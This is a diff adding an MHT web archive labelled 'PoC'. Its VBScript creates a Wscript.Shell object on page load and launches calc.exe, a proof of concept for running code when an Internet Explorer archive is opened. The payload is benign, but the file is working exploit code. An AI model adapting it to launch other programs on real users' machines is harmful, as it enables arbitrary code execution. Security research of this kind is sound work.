@@ -1,0 +1,25 @@
+From: "Saved by Internet Explorer 11"
+Subject: 
+Date: Mon, 15 Apr 2019 16:08:57 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+Content-Location: mhtml:file://C:\calc.mht
+X-MimeOLE: Produced By Microsoft MimeOLE
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+<head>
+	<title>Calc</title>
+	<script language="VBScript">
+		Sub RunProgram
+            Set objShell = CreateObject("Wscript.Shell")
+            objShell.Run "c:\windows\system32\calc.exe"
+        End Sub
+	</script>
+</head>
+<body onload="RunProgram">
+    <h1>PoC</h1>
+</body>
+</html>
